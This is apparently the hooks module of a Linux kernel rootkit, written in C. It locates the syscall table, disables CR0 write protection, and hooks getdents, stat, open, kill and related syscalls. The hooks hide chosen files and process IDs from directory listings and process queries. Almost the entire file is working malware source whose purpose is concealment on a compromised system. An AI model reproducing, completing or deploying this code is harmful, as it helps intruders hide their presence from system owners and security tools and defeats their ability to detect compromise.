#include <linux/version.h>  // LINUX_VERSION_CODE
#include <linux/syscalls.h> // __MAP, __SC_DECL, __NR_syscall
#include <linux/slab.h>		// kmalloc()

#include "config.h"
#include "hooks.h"
#include "hiding.h"

// Custom write_cr0 as the one the kernel provides checks if we are overwriting WP bit
#define WP_BIT_IN_CR0 16

#define write_cr0(val) asm volatile("mov %0, %%cr0":"+r" (val), "+m" (__force_order));

static void ENABLE_WRITE(void){
	unsigned long val = read_cr0() & (~(1<<WP_BIT_IN_CR0));
	write_cr0(val)
}
static void DISABLE_WRITE(void){
	unsigned long val = read_cr0() | (1<<WP_BIT_IN_CR0);
	write_cr0(val)
}

// Necessary stuff for getdents and getdents64 hooks
struct linux_dirent {
	unsigned long   d_ino;
	unsigned long   d_off;
	// d_reclen is the way to tell the length of this entry
	unsigned short  d_reclen;
	// Its length is actually longer, and the struct size is variable
	char            d_name[1];
};

typedef unsigned long long ino64_t;
typedef unsigned long long off64_t;
struct linux_dirent64 {
	ino64_t         d_ino;
	off64_t         d_off;
	unsigned short  d_reclen; 
	// I don't know why but without this d_name includes one extra byte
	// at the beggining that doesn't belong to the name
	char            padding; 
	char            d_name[1]; 
};

static unsigned long *syscall_table = NULL;

/* HOOK DEFINING MACROS ------------------------------------------------------
 * Each hook is made up of three functions: sys_orig, sys_hook and
 * sys_do_hook. When the hook is performed, the original address of the 
 * syscall is saved as sys_orig, and it is replaced by sys_hook, which calls
 * sys_do_hook. This last function is where the job is done, and may call
 * sys_orig or not.
 * 
 * There seem to be two different calling convention in linux kernel depending
 * on the version. *Above 4.17, normal args are replaced by a struct pt_regs*.
 * Because of that, there are macros for handling both calling conventions
 * so we can define hooks easily from `hook_define`:
 *  - DECL_DO_HOOK: Arguments of the declaration of sys_do_hook
 *  - DECL_ORIG_HOOK: Arguments of the declaration of sys_orig and sys_hook
 *  - ARGS_DO_HOOK: Arguments for calling sys_do_hook (usually from sys_hook)
 *  - ARGS_ORIG: Arguments for calling sys_orig (usually from sys_do_hook)
 * 
 * Note sys_do_hook always receives normal arguments and also regs, which
 * is non-NULL only if kernel version is above 4.17, when it needs it for
 * calling sys_orig.
*/
#define sys_orig(name) sys_##name##_orig
#define sys_hook(name) sys_##name##_hook
#define sys_do_hook(name) sys_##name##_do_hook
#define sys_num(name) __NR_##name
#define sys_define(name_mayus) HOOK_##name_mayus

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 17, 0)
// Accessing pt_regs, similar to how kernel defines __MAP in syscalls.h
#define args1 regs->di
#define args2 args1, regs->si
#define args3 args2, regs->dx
#define args4 args3, regs->r10
#define args5 args4, regs->r8
#define args6 args5, regs->r9
#define args(n) args##n

#define DECL_DO_HOOK(n_args, ...) __MAP(n_args, __SC_DECL, __VA_ARGS__), const struct pt_regs* regs
#define DECL_ORIG_HOOK(n_args, ...) const struct pt_regs* regs
#define ARGS_DO_HOOK(n_args, ...) args(n_args), regs
#define ARGS_ORIG(n_args, ...) regs

#else
#define DECL_DO_HOOK(n_args, ...) __MAP(n_args, __SC_DECL, __VA_ARGS__), const struct pt_regs* regs
#define DECL_ORIG_HOOK(n_args, ...) __MAP(n_args, __SC_DECL, __VA_ARGS__)
#define ARGS_DO_HOOK(n_args, ...) ARGS_ORIG(n_args, __VA_ARGS__), NULL //regs is null, as these kernel versions do not use it
#define ARGS_ORIG(n_args, ...) __MAP(n_args, __SC_ARGS, __VA_ARGS__)
#endif

// Similar to how kernel defines syscalls using SYSCALL_DEFINEx
#define hook_define(n_args, ret_type, name, ...)                                            \
	static asmlinkage ret_type sys_do_hook(name)(DECL_DO_HOOK(n_args, __VA_ARGS__));        \
	static asmlinkage ret_type (*sys_orig(name))(DECL_ORIG_HOOK(n_args, __VA_ARGS__));      \
	static asmlinkage ret_type sys_hook(name)(DECL_ORIG_HOOK(n_args, __VA_ARGS__)){         \
		ret_type ret = sys_do_hook(name)(ARGS_DO_HOOK(n_args, __VA_ARGS__));                \
		return ret;                                                                         \
	}

// Save original syscall and write the hook
#define perform_hook(name, name_mayus) \
	sys_orig(name) = (void*)syscall_table[sys_num(name)]; \
	if (sys_define(name_mayus)) syscall_table[sys_num(name)] = sys_hook(name);

// Restore original syscall
#define disable_hook(name, name_mayus) \
	if (sys_define(name_mayus)) syscall_table[sys_num(name)] = sys_orig(name);

// END HOOK DEFINING MACROS --------------------------------------------------

hook_define(3, long, getdents, unsigned int, fd, struct linux_dirent __user*, dirent, unsigned int, count)
hook_define(3, long, getdents64, unsigned int, fd, struct linux_dirent64 __user*, dirent, unsigned int, count)
hook_define(2, long, stat, const char __user*, pathname, struct stat __user*, statbuf) // actually newstat
hook_define(2, long, stat64, const char __user*, pathname, struct stat64 __user*, statbuf)
hook_define(2, long, lstat, const char __user*, pathname, struct stat __user*, statbuf) // actually newlstat
hook_define(2, long, lstat64, const char __user*, pathname, struct stat64 __user*, statbuf)
hook_define(1, long, chdir, const char __user*, pathname)
hook_define(2, long, getpriority, int, which, int, who)
hook_define(3, long, open, const char __user*, pathname, int, flags, umode_t, mode)
hook_define(4, long, openat, int, dfd, const char __user*, pathname, int, flags, umode_t, mode)
hook_define(1, long, getpgid, pid_t, pid)
hook_define(1, long, getsid, pid_t, pid)
hook_define(3, long, sched_getaffinity, pid_t, pid, unsigned int, len, unsigned long __user*, user_mask_ptr)
hook_define(2, long, sched_getparam, pid_t, pid, struct sched_param __user *, param)
hook_define(1, long, sched_getscheduler, pid_t, pid)
hook_define(2, long, sched_rr_get_interval, pid_t, pid, void __user *, interval)
hook_define(2, long, kill, pid_t, pid, int, sig)

// Macro for defining getdents and getdents64 do_hook. They're almost the same
#define sys_getdents_do_hook_define(v)                                                               \
static asmlinkage long sys_getdents##v##_do_hook(unsigned int fd, struct linux_dirent##v __user* dirent, unsigned int count, const struct pt_regs* regs) { \
	int buff_offset, deleted_size;                                                                   \
	struct linux_dirent##v* currnt;                                                                  \
	struct linux_dirent##v* my_dirent;                                                               \
	bool del;                                                                                        \
	unsigned long pid;                                                                               \
	long ret;                                                                                        \
\
	ret = sys_getdents##v##_orig(ARGS_ORIG(3, unsigned int, fd, struct linux_dirent##v __user*, dirent, unsigned int, count)); \
\
	/* Copy dirent buff to kernel memory */                                                          \
	my_dirent = kmalloc(ret, GFP_KERNEL);                                                            \
	if (my_dirent == NULL){                                                                          \
		log("ROOTKIT: ERROR kmalloc(%ld) in getdents hook", ret);                                     \
		return -1;                                                                                   \
	}                                                                                                \
	copy_from_user(my_dirent, dirent, ret);                                                          \
\
	/* Delete the entry if it contains HIDE_STR, if it is a hidden file or if it is a hidden pid */  \
	buff_offset = 0;                                                                                 \
	while (buff_offset < ret){                                                                       \
		currnt = (struct linux_dirent##v*)((char*)my_dirent + buff_offset);                          \
		del = false;                                                                                 \
		if (strstr(currnt->d_name, HIDE_STR) != NULL)                                                \
			del = true;                                                                              \
\
		if (is_file_hidden(currnt->d_name))                                                          \
			del = true;                                                                              \
\
		/* only if conversion to unsigned long succeeds */                                           \
		if (kstrtoul(currnt->d_name, 10, &pid) == 0 && is_pid_hidden(pid))                           \
			del = true;                                                                              \
\
		if (del){                                                                                    \
			/* Copies the rest of the buffer to the position of the current entry */                 \
			deleted_size = currnt->d_reclen;                                                         \
			memcpy(currnt, (char*)currnt + currnt->d_reclen,  ret - buff_offset - currnt->d_reclen); \
			ret -= deleted_size;                                                                     \
		} else                                                                                       \
			buff_offset += currnt->d_reclen;                                                         \
\
	}                                                                                                \
	copy_to_user(dirent, my_dirent, ret);                                                            \
	kfree(my_dirent);                                                                                \
	return ret;                                                                                      \
}

sys_getdents_do_hook_define()
sys_getdents_do_hook_define(64)

// Wrapper for pid_in_pathname which adds logging
static int check_pid_in_pathname(const char __user *pathname, const char* syscall_caller){
	int pid;
	if ((pid = pid_in_pathname(pathname)) != -1){
		log(KERN_INFO "ROOTKIT: Hidden process %d from call to %s\n", pid, syscall_caller);
		return -1;
	}
	return 0;
}

// Wrapper for is_pid_hidden which adds logging
static int check_pid(int pid, const char* syscall_caller){
	if (is_pid_hidden(pid)){
		log(KERN_INFO "ROOTKIT: Hidden process %d from call to %s\n", pid, syscall_caller);
		return -1;
	}
	return 0;
}

// Hooks for those syscalls that will try to discover hidden PIDs
static asmlinkage long sys_stat_do_hook(const char __user *pathname, struct stat __user *statbuf, const struct pt_regs* regs){
	if (check_pid_in_pathname(pathname, "stat") == -1) return -ENOENT;
	return sys_stat_orig(ARGS_ORIG(2, const char __user *, pathname, struct stat __user*, statbuf));
}

static asmlinkage long sys_lstat_do_hook(const char __user *pathname, struct stat __user *statbuf, const struct pt_regs* regs){
	if (check_pid_in_pathname(pathname, "lstat") == -1) return -ENOENT;
	return sys_lstat_orig(ARGS_ORIG(2, const char __user *, pathname, struct stat __user*, statbuf));
}

static asmlinkage long sys_stat64_do_hook(const char __user *pathname, struct stat64 __user *statbuf, const struct pt_regs* regs){
	if (check_pid_in_pathname(pathname, "stat64") == -1) return -ENOENT;
	return sys_stat64_orig(ARGS_ORIG(2, const char __user *, pathname, struct stat64 __user *, statbuf));
}

static asmlinkage long sys_lstat64_do_hook(const char __user *pathname, struct stat64 __user *statbuf, const struct pt_regs* regs){
	if (check_pid_in_pathname(pathname, "lstat64") == -1) return -ENOENT;
	return sys_lstat64_orig(ARGS_ORIG(2, const char __user *, pathname, struct stat64 __user*, statbuf));
}

static asmlinkage long sys_chdir_do_hook(const char __user *pathname, const struct pt_regs* regs){
	if (check_pid_in_pathname(pathname, "chdir") == -1) return -ENOENT;
	return sys_chdir_orig(ARGS_ORIG(1, const char __user*, pathname));
}

static asmlinkage long sys_getpriority_do_hook(int which, int who, const struct pt_regs* regs){
	if (which == PRIO_PROCESS && check_pid(who, "getpriority") == -1) return -ENOENT;
	return sys_getpriority_orig(ARGS_ORIG(2, int, which, int, who));
}

static asmlinkage long sys_open_do_hook(const char __user *pathname, int flags, umode_t mode, const struct pt_regs* regs){
	if (check_pid_in_pathname(pathname, "open") == -1) return -ENOENT;
	return sys_open_orig(ARGS_ORIG(3, const char __user*, pathname, int, flags, umode_t, mode));
}

static asmlinkage long sys_openat_do_hook(int dfd, const char __user *pathname, int flags, umode_t mode, const struct pt_regs* regs){
	if (check_pid_in_pathname(pathname, "openat") == -1) return -ENOENT;
	return sys_openat_orig(ARGS_ORIG(4, int, dfd, const char __user*, pathname, int, flags, umode_t, mode));
}

static asmlinkage long sys_getpgid_do_hook(pid_t pid, const struct pt_regs* regs){
	if (check_pid(pid, "getpgid") == -1) return -ESRCH;
	return sys_getpgid_orig(ARGS_ORIG(1, pid_t, pid));
}

static asmlinkage long sys_getsid_do_hook(pid_t pid, const struct pt_regs* regs){
	if (check_pid(pid, "getsid") == -1) return -ESRCH;
	return sys_getsid_orig(ARGS_ORIG(1, pid_t, pid));
}

static asmlinkage long sys_sched_getaffinity_do_hook(pid_t pid, unsigned int len, unsigned long __user *user_mask_ptr, const struct pt_regs* regs){
	if (check_pid(pid, "sched_getaffinity") == -1) return -ESRCH;
	return sys_sched_getaffinity_orig(ARGS_ORIG(3, pid_t, pid, unsigned int, len, unsigned long __user*, user_mask_ptr));
}

static asmlinkage long sys_sched_getparam_do_hook(pid_t pid, struct sched_param __user *param, const struct pt_regs* regs){
	if (check_pid(pid, "sched_getparam") == -1) return -ESRCH;
	return sys_sched_getparam_orig(ARGS_ORIG(2, pid_t, pid, struct sched_param __user *, param));
}

static asmlinkage long sys_sched_getscheduler_do_hook(pid_t pid, const struct pt_regs* regs){
	if (check_pid(pid, "sched_getscheduler") == -1) return -ESRCH;
	return sys_sched_getscheduler_orig(ARGS_ORIG(1, pid_t, pid));
}

static asmlinkage long sys_sched_rr_get_interval_do_hook(pid_t pid, void __user *interval, const struct pt_regs* regs){
	if (check_pid(pid, "sched_rr_get_interval") == -1) return -ESRCH;
	return sys_sched_rr_get_interval_orig(ARGS_ORIG(2, pid_t, pid, void __user *, interval));
}

static asmlinkage long sys_kill_do_hook(pid_t pid, int sig, const struct pt_regs* regs){
	if (check_pid(pid, "kill") == -1) return -ESRCH;
	return sys_kill_orig(ARGS_ORIG(2, pid_t, pid, int, sig));
}


//__init so it is removed from memory after being called once
int __init hooks_init(void){
	if ((syscall_table = (void *)kallsyms_lookup_name("sys_call_table")) == NULL){
		log(KERN_ERR "ROOTKIT ERROR: Syscall table not found!");
		return -1;
	}
	log(KERN_INFO "ROOTKIT: Syscall table found at %lx\n", (long unsigned int)syscall_table);
	log(KERN_INFO "ROOTKIT: Starting hooks\n");

	ENABLE_WRITE(); //there must be a way to do this better
	perform_hook(getdents, GETDENTS)
	perform_hook(getdents64, GETDENTS64)
	perform_hook(stat, STAT)
	perform_hook(lstat, LSTAT)
	#if defined(__ARCH_WANT_STAT64) || defined(__ARCH_WANT_COMPAT_STAT64)
	perform_hook(stat64, STAT64)
	perform_hook(lstat64, LSTAT64)
	#endif
	perform_hook(chdir, CHDIR)
	perform_hook(getpriority, GETPRIORITY)
	perform_hook(open, OPEN)
	perform_hook(openat, OPENAT)
	perform_hook(getpgid, GETPGID)
	perform_hook(getsid, GETSID)
	perform_hook(sched_getaffinity, SCHED_GETAFFINITY)
	perform_hook(sched_getparam, SCHED_GETPARAM)
	perform_hook(sched_getscheduler, SCHED_GETSCHEDULER)
	perform_hook(sched_rr_get_interval, SCHED_RR_GET_INTERVAL)
	perform_hook(kill, KILL)
	DISABLE_WRITE();

	log(KERN_INFO "ROOTKIT: Finished hooks\n");
	return 0;
}


void hooks_exit(void){
	ENABLE_WRITE();
	disable_hook(getdents, GETDENTS)
	disable_hook(getdents64, GETDENTS64)
	disable_hook(stat, STAT)
	disable_hook(lstat, LSTAT)
	#if defined(__ARCH_WANT_STAT64) || defined(__ARCH_WANT_COMPAT_STAT64)
	disable_hook(stat64, STAT64)
	disable_hook(lstat64, LSTAT64)
	#endif
	disable_hook(chdir, CHDIR)
	disable_hook(getpriority, GETPRIORITY)
	disable_hook(open, OPEN)
	disable_hook(openat, OPENAT)
	disable_hook(getpgid, GETPGID)
	disable_hook(getsid, GETSID)
	disable_hook(sched_getaffinity, SCHED_GETAFFINITY)
	disable_hook(sched_getparam, SCHED_GETPARAM)
	disable_hook(sched_getscheduler, SCHED_GETSCHEDULER)
	disable_hook(sched_rr_get_interval, SCHED_RR_GET_INTERVAL)
	disable_hook(kill, KILL)
	DISABLE_WRITE();
}
